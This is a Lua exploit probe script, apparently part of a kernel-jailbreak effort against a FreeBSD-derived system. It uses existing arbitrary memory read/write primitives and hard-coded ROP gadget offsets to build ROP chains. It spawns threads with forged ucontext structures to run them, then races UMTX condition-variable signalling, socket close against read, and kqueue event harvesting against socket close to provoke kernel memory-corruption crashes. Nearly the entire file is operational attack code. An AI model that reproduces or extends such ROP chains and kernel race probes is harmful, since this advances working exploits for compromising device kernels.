-- CRASH_CLASS: MODERATE
-- PROBE 128d: UMTX condition variable race + socket fd close race
--
-- Context: 128b showed UMTX mutex ops are solid. 128c showed pipe(42) is dead
-- and mmap/munmap is clean. Now testing:
--
-- [A] UMTX CV (condition variable) race — child CV_SIGNAL/BROADCAST in tight
--     loop while main does CV_WAIT. The CV code path has more complex kernel
--     state (wait queue, mutex handoff) than basic mutexes.
--
-- [B] Socket close/read race — socket(97) works. Child reads from socket fd
--     while main closes it. Tests file refcount handling during concurrent ops.
--
-- [C] kqueue + socket close race — register EVFILT_READ on socket, child
--     closes socket while main harvests events. Tests knote detach path.

print("=== PROBE 128d: CV + SOCKET RACE ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa = syscall.syscall_address
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
if text_lo < 0 then text_lo = text_lo + 0x100000000 end
if text_hi < 0 then text_hi = text_hi + 0x100000000 end

local function eaddr(off)
    return uint64(string.format("0x%X%08X", text_hi, text_lo + off))
end

local G = {
    ret     = 0x42,
    pop_rax = 0x992,
    pop_rsp = 0x9A2,
    pop_rdi = 0xC9DFE,
    pop_rsi = 0xD77D,
    pop_rdx = 0x3B02D7,
    mov_w   = 0x92C67,
}

local sc_umtx = mk(454)
local sc_socket = mk(97)
local sc_close = mk(6)
local sc_read = mk(3)
local sc624 = mk(624)

local shared = memory.alloc(0x4000)
local S = N(shared)

-- [A] UMTX CV race
print("[A] UMTX CV signal/broadcast race")

-- struct ucond at S: {c_has_waiters(4), c_flags(4), c_clockid(4), c_spare(4)}
local CV_ADDR = S
local MTX_ADDR = S + 0x40

-- Initialize CV: all zero
for off = 0, 0x7F, 4 do wd(S + off, 0) end

-- struct _umtx_time for timeout: {timespec{sec, nsec}, _flags, _clockid}
local tmo = memory.alloc(24)
wq(N(tmo), uint64(0))            -- sec = 0
wq(N(tmo) + 8, uint64(5000000))  -- nsec = 5ms
wd(N(tmo) + 16, 0)               -- flags = 0 (relative)
wd(N(tmo) + 20, 0)               -- clockid = REALTIME

-- Build child ROP chain: tight CV_SIGNAL + CV_BROADCAST loop
local stk = memory.alloc(0x8000)
local CB = N(stk) + 0x4000

-- CV_SIGNAL (op 9)
wq(CB + 0x00, eaddr(G.pop_rax))
wq(CB + 0x08, uint64(454))
wq(CB + 0x10, eaddr(G.pop_rdi))
wq(CB + 0x18, uint64(string.format("0x%X", CV_ADDR)))
wq(CB + 0x20, eaddr(G.pop_rsi))
wq(CB + 0x28, uint64(9))            -- CV_SIGNAL
wq(CB + 0x30, sa)

-- CV_BROADCAST (op 10)
wq(CB + 0x38, eaddr(G.pop_rax))
wq(CB + 0x40, uint64(454))
wq(CB + 0x48, eaddr(G.pop_rdi))
wq(CB + 0x50, uint64(string.format("0x%X", CV_ADDR)))
wq(CB + 0x58, eaddr(G.pop_rsi))
wq(CB + 0x60, uint64(10))           -- CV_BROADCAST
wq(CB + 0x68, sa)

-- Loop
wq(CB + 0x70, eaddr(G.pop_rsp))
wq(CB + 0x78, uint64(string.format("0x%X", CB)))

-- Build ucontext for child
local ctx = memory.alloc(0x500)
local tid_buf = memory.alloc(8)
local BC = N(ctx)

for off = 0, 0x4BC, 4 do wd(BC + off, 0) end
wd(BC + 0x108, 0x480)
wd(BC + 0xD0, 0)
wd(BC + 0x110, 0x10000)
wd(BC + 0xC0, 0x43)
wd(BC + 0x100, 0x3B)
local rip_lo = (text_lo + G.ret) % 0x100000000
local rip_hi = text_hi + math.floor((text_lo + G.ret) / 0x100000000)
wd(BC + 0xE0, rip_lo)
wd(BC + 0xE4, rip_hi)
local rsp_lo = CB % 0x100000000
local rsp_hi = math.floor(CB / 0x100000000)
wd(BC + 0xF8, rsp_lo)
wd(BC + 0xFC, rsp_hi)

wq(N(tid_buf), uint64("0x0"))
local tr = nil
pcall(function() tr = mk(430)(ctx, tid_buf, uint64(0)) end)
local child_tid = rq(N(tid_buf))
print(string.format("  child: ret=%s tid=%s", fmt(tr), fmt(child_tid)))

if tr ~= nil and N(tr) == 0 then
    -- Let child start signaling
    for i = 1, 20 do native.fcall_with_rax(stub, 20) end

    local cv_ok = 0
    local cv_timeout = 0
    local cv_crash = 0
    local cv_err = 0
    local cv_dead = false

    for iter = 1, 200 do
        -- Lock the mutex first (required before CV_WAIT)
        local lr = nil
        pcall(function()
            lr = sc_umtx(uint64(string.format("0x%X", MTX_ADDR)), uint64(5),
                uint64(0), uint64(0), uint64(0), uint64(0))
        end)

        -- CV_WAIT: atomically release mutex + sleep, wake on signal or timeout
        local cr = nil
        local cok = pcall(function()
            cr = sc_umtx(uint64(string.format("0x%X", CV_ADDR)), uint64(8),
                uint64(0),
                uint64(string.format("0x%X", MTX_ADDR)),
                uint64(N(tmo)),
                uint64(0))
        end)

        if not cok then
            cv_crash = cv_crash + 1
        else
            local rv = cr and N(cr) or -999
            if rv == 0 then cv_ok = cv_ok + 1
            elseif rv == -1 then cv_timeout = cv_timeout + 1
            else cv_err = cv_err + 1 end
        end

        -- Unlock mutex
        pcall(function()
            sc_umtx(uint64(string.format("0x%X", MTX_ADDR)), uint64(6),
                uint64(0), uint64(0), uint64(0), uint64(0))
        end)

        if not alive() then
            cv_dead = true
            print(string.format("  *** DIED at iter %d ***", iter))
            break
        end

        if iter % 50 == 0 then
            local hw = rd(CV_ADDR) or 0
            print(string.format("  i=%d ok=%d tmo=%d crash=%d err=%d has_w=%d",
                iter, cv_ok, cv_timeout, cv_crash, cv_err, hw))
        end
    end

    if not cv_dead then
        print(string.format("  A FINAL: ok=%d tmo=%d crash=%d err=%d", cv_ok, cv_timeout, cv_crash, cv_err))
    end
else
    print("  thread creation failed!")
end

if not alive() then
    print("DEAD AFTER A!")
    print("=== 128d COMPLETE (DEAD) ===")
    return
end

-- [B] Socket close/read race
print("")
print("[B] Socket close/read race")

local sock_ok = 0
local sock_fail = 0
local sock_crash = 0
local sock_dead = false

for round = 1, 40 do
    -- Create a UNIX stream socket
    local sfd = nil
    pcall(function()
        sfd = sc_socket(uint64(1), uint64(1), uint64(0))  -- AF_UNIX=1, SOCK_STREAM=1
    end)

    if sfd == nil or N(sfd) == -1 then
        -- Try INET
        pcall(function()
            sfd = sc_socket(uint64(2), uint64(1), uint64(0))  -- AF_INET=2, SOCK_STREAM=1
        end)
    end

    if sfd == nil or N(sfd) == -1 then
        print("  socket failed round " .. round)
        break
    end
    local fd_num = N(sfd)

    -- Build child: close(fd) in tight loop
    local stk2 = memory.alloc(0x4000)
    local CB2 = N(stk2) + 0x2000
    local ctx2 = memory.alloc(0x500)
    local tid2 = memory.alloc(8)
    local BC2 = N(ctx2)

    wq(CB2 + 0x00, eaddr(G.pop_rax))
    wq(CB2 + 0x08, uint64(6))           -- close
    wq(CB2 + 0x10, eaddr(G.pop_rdi))
    wq(CB2 + 0x18, uint64(fd_num))
    wq(CB2 + 0x20, sa)

    wq(CB2 + 0x28, eaddr(G.pop_rsp))
    wq(CB2 + 0x30, uint64(string.format("0x%X", CB2)))

    for off = 0, 0x4BC, 4 do wd(BC2 + off, 0) end
    wd(BC2 + 0x108, 0x480)
    wd(BC2 + 0xD0, 0)
    wd(BC2 + 0x110, 0x10000)
    wd(BC2 + 0xC0, 0x43)
    wd(BC2 + 0x100, 0x3B)
    wd(BC2 + 0xE0, rip_lo)
    wd(BC2 + 0xE4, rip_hi)
    local rsp2_lo = CB2 % 0x100000000
    local rsp2_hi = math.floor(CB2 / 0x100000000)
    wd(BC2 + 0xF8, rsp2_lo)
    wd(BC2 + 0xFC, rsp2_hi)

    wq(N(tid2), uint64("0x0"))
    local tr2 = nil
    pcall(function() tr2 = mk(430)(ctx2, tid2, uint64(0)) end)
    if tr2 == nil or N(tr2) ~= 0 then
        pcall(function() sc_close(uint64(fd_num)) end)
        if round > 8 then
            print("  thread budget exhausted at round " .. round)
            break
        end
        break
    end

    -- RACE: main reads from socket while child closes it
    local rbuf = memory.alloc(64)
    for attempt = 1, 20 do
        local rr = nil
        local rok = pcall(function()
            rr = sc_read(uint64(fd_num), rbuf, uint64(32))
        end)

        if not rok then sock_crash = sock_crash + 1
        elseif rr and N(rr) == -1 then sock_fail = sock_fail + 1
        else sock_ok = sock_ok + 1 end

        if not alive() then
            sock_dead = true
            print(string.format("  *** DIED round=%d attempt=%d ***", round, attempt))
            break
        end
    end

    if sock_dead then break end

    -- Let child run
    for i = 1, 10 do native.fcall_with_rax(stub, 20) end

    if round % 10 == 0 then
        print(string.format("  r=%d ok=%d fail=%d crash=%d", round, sock_ok, sock_fail, sock_crash))
    end
end

if not sock_dead then
    print(string.format("  B FINAL: ok=%d fail=%d crash=%d", sock_ok, sock_fail, sock_crash))
end

if not alive() then
    print("DEAD AFTER B!")
    print("=== 128d COMPLETE (DEAD) ===")
    return
end

-- [C] kqueue + socket close race
print("")
print("[C] kqueue + socket close race")

local sc_kqueue = mk(362)
local sc_kevent = mk(363)

local kq = nil
pcall(function() kq = sc_kqueue() end)
if kq == nil or N(kq) == -1 then
    print("  kqueue failed")
else
    local kq_fd = N(kq)
    print("  kq=" .. kq_fd)

    local kq_ok = 0
    local kq_err = 0
    local kq_crash = 0
    local kq_dead = false

    for round = 1, 30 do
        -- Create socket for events
        local sfd3 = nil
        pcall(function()
            sfd3 = sc_socket(uint64(2), uint64(2), uint64(0))  -- AF_INET=2, SOCK_DGRAM=2
        end)
        if sfd3 == nil or N(sfd3) == -1 then
            print("  socket3 failed round " .. round)
            break
        end
        local fd3 = N(sfd3)

        -- Register EVFILT_READ on socket
        -- struct kevent: {ident(8), filter(2), flags(2), fflags(4), data(8), udata(8)} = 32 bytes
        local kev_in = memory.alloc(0x20)
        -- ident = fd
        wq(N(kev_in), uint64(fd3))
        -- filter=EVFILT_READ(0xFFFF=-1 as i16), flags=EV_ADD(0x01)|EV_ENABLE(0x04)=0x05
        -- packed: filter(i16) | flags(u16) → 0x0005FFFF
        wd(N(kev_in) + 8, 0x0005FFFF)
        wd(N(kev_in) + 12, 0)   -- fflags
        wq(N(kev_in) + 16, uint64(0))   -- data
        wq(N(kev_in) + 24, uint64(0))   -- udata

        -- Register
        pcall(function()
            sc_kevent(uint64(kq_fd), uint64(N(kev_in)), uint64(1),
                uint64(0), uint64(0), uint64(0))
        end)

        -- Build child: close(fd3) in tight loop
        local stk3 = memory.alloc(0x4000)
        local CB3 = N(stk3) + 0x2000
        local ctx3 = memory.alloc(0x500)
        local tid3 = memory.alloc(8)
        local BC3 = N(ctx3)

        wq(CB3 + 0x00, eaddr(G.pop_rax))
        wq(CB3 + 0x08, uint64(6))           -- close
        wq(CB3 + 0x10, eaddr(G.pop_rdi))
        wq(CB3 + 0x18, uint64(fd3))
        wq(CB3 + 0x20, sa)

        wq(CB3 + 0x28, eaddr(G.pop_rsp))
        wq(CB3 + 0x30, uint64(string.format("0x%X", CB3)))

        for off = 0, 0x4BC, 4 do wd(BC3 + off, 0) end
        wd(BC3 + 0x108, 0x480)
        wd(BC3 + 0xD0, 0)
        wd(BC3 + 0x110, 0x10000)
        wd(BC3 + 0xC0, 0x43)
        wd(BC3 + 0x100, 0x3B)
        wd(BC3 + 0xE0, rip_lo)
        wd(BC3 + 0xE4, rip_hi)
        local rsp3_lo = CB3 % 0x100000000
        local rsp3_hi = math.floor(CB3 / 0x100000000)
        wd(BC3 + 0xF8, rsp3_lo)
        wd(BC3 + 0xFC, rsp3_hi)

        wq(N(tid3), uint64("0x0"))
        local tr3 = nil
        pcall(function() tr3 = mk(430)(ctx3, tid3, uint64(0)) end)
        if tr3 == nil or N(tr3) ~= 0 then
            pcall(function() sc_close(uint64(fd3)) end)
            if round > 5 then
                print("  thread budget at round " .. round)
                break
            end
            break
        end

        -- RACE: harvest kevent while child closes fd
        local kev_out = memory.alloc(0x20)
        local ts = memory.alloc(16)
        wq(N(ts), uint64(0))       -- tv_sec
        wq(N(ts) + 8, uint64(0))   -- tv_nsec (poll)

        for attempt = 1, 15 do
            local kr = nil
            local kok = pcall(function()
                kr = sc_kevent(uint64(kq_fd), uint64(0), uint64(0),
                    uint64(N(kev_out)), uint64(1), uint64(N(ts)))
            end)

            if not kok then kq_crash = kq_crash + 1
            elseif kr and N(kr) >= 0 then kq_ok = kq_ok + 1
            else kq_err = kq_err + 1 end

            if not alive() then
                kq_dead = true
                print(string.format("  *** DIED round=%d attempt=%d ***", round, attempt))
                break
            end
        end

        if kq_dead then break end

        for i = 1, 10 do native.fcall_with_rax(stub, 20) end

        if round % 10 == 0 then
            print(string.format("  r=%d ok=%d err=%d crash=%d", round, kq_ok, kq_err, kq_crash))
        end
    end

    if not kq_dead then
        print(string.format("  C FINAL: ok=%d err=%d crash=%d", kq_ok, kq_err, kq_crash))
    end
end

-- [D] Post state
print("")
print("[D] Post-race state")
local vret = nil
pcall(function() vret = sc624() end)
print(string.format("  vmd=%s", vret and tostring(N(vret)) or "FAIL"))

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 128d COMPLETE ===")
